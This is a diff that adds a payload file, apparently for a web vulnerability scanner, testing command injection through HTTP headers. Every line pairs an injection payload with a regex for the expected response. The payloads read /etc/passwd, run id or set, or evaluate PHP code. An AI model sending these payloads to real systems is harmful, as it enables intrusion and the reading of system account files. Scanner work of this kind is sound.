@@ -1,0 +1,14 @@
+# header头的命令注入
+
+{payload=#cat /etc/passwd#}               {response=#root:[[:lower:]]:\d+:\d+:[\w_\-]+:[/\w_\-]+:/bin/bash#}
+{payload=#|cat /etc/passwd#}              {response=#root:[[:lower:]]:\d+:\d+:[\w_\-]+:[/\w_\-]+:/bin/bash#}
+{payload=#;cat /etc/passwd;#}             {response=#root:[[:lower:]]:\d+:\d+:[\w_\-]+:[/\w_\-]+:/bin/bash#}
+{payload=#';cat /etc/passwd;'#}           {response=#root:[[:lower:]]:\d+:\d+:[\w_\-]+:[/\w_\-]+:/bin/bash#}
+{payload=#";cat /etc/passwd;"#}           {response=#root:[[:lower:]]:\d+:\d+:[\w_\-]+:[/\w_\-]+:/bin/bash#}
+{payload=#/usr/bin/id;#}                  {response=#uid=\d+\(\w+\) gid=\d+\(\w+\) groups=\d+\(\w+\)#}
+{payload=#;/usr/bin/id;#}                 {response=#uid=\d+\(\w+\) gid=\d+\(\w+\) groups=\d+\(\w+\)#}
+{payload=#set#}                           {response=#ALLUSERSPROFILE=.*?CommonProgramFiles=.*?PATHEXT=.*?TEMP=.*?#}
+{payload=#||set#}                         {response=#ALLUSERSPROFILE=.*?CommonProgramFiles=.*?PATHEXT=.*?TEMP=.*?#}
+{payload=#${@print(md5(598645))};#}       {response=#8e4d6a6ae4d9ef90d56a4a57790ad18c#}
+{payload=#string:{var_dump(md5(598645))}#}{response=#8e4d6a6ae4d9ef90d56a4a57790ad18c#}
+{payload=#'];${@print(md5(598645))};//#}  {response=#8e4d6a6ae4d9ef90d56a4a57790ad18c#}
